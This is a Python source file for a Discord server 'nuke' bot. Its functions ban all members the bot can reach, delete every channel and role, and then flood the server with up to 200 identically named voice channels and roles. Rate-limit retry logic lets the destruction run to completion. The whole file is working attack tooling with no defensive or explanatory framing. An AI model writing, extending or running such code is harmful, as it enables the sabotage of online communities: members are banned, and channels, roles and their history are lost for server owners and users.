import discord
from discord.ext import commands
import asyncio

RATE_LIMIT_DELAY = 0.5  # seconds between calls

async def safe_delete(obj, delete_coro, *args, **kwargs):
    """
    Wrapper to call delete_coro(obj, *args, **kwargs) with rate-limit handling.
    """
    while True:
        try:
            result = await delete_coro(*args, **kwargs)
            await asyncio.sleep(RATE_LIMIT_DELAY)
            return result
        except discord.HTTPException as e:
            if e.status == 429:
                retry = e.retry_after if hasattr(e, 'retry_after') else RATE_LIMIT_DELAY
                print(f"Rate limited! Sleeping for {retry:.2f} seconds...")
                await asyncio.sleep(retry)
            else:
                # other HTTP errors: skip
                return 0

async def delete_all_channels(guild):
    deleted = 0
    for channel in list(guild.channels):
        if channel:
            res = await safe_delete(channel, channel.delete)
            deleted += 1 if res is None else 0
    return deleted

async def delete_all_roles(guild):
    deleted = 0
    # skip @everyone (always first)
    for role in [r for r in guild.roles if r.name != "@everyone"]:
        res = await safe_delete(role, role.delete)
        deleted += 1 if res is None else 0
    return deleted

async def ban_all_members(guild):
    banned = 0
    for member in guild.members:
        # skip bots or the bot itself if you want
        if member == guild.me:
            continue
        try:
            await member.ban(reason="Nuke")  
            banned += 1
        except discord.Forbidden:
            pass
        except discord.HTTPException as e:
            if e.status == 429:
                print(f"Rate limited banning. Sleeping {e.retry_after}s")
                await asyncio.sleep(e.retry_after)
                continue
        await asyncio.sleep(RATE_LIMIT_DELAY)
    return banned

async def create_roles(guild, name):
    created = 0
    to_create = 200 - len(guild.roles)
    for _ in range(to_create):
        try:
            await guild.create_role(name=name)
            created += 1
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after)
        await asyncio.sleep(RATE_LIMIT_DELAY)
    return created

async def create_voice_channels(guild, name):
    created = 0
    to_create = 200 - len(guild.channels)
    for _ in range(to_create):
        try:
            await guild.create_voice_channel(name=name)
            created += 1
        except discord.HTTPException as e:
            if e.status == 429:
                await asyncio.sleep(e.retry_after)
        await asyncio.sleep(RATE_LIMIT_DELAY)
    return created

async def nuke_guild(guild, name):
    print(f"Nuking {guild.name}…")
    banned = await ban_all_members(guild)
    print(f"  Banned {banned} members.")
    ch_del = await delete_all_channels(guild)
    print(f"  Deleted {ch_del} channels.")
    rl_del = await delete_all_roles(guild)
    print(f"  Deleted {rl_del} roles.")
    ch_cr = await create_voice_channels(guild, name)
    print(f"  Created {ch_cr} voice channels.")
    rl_cr = await create_roles(guild, name)
    print(f"  Created {rl_cr} roles.")
    print("-" * 40)
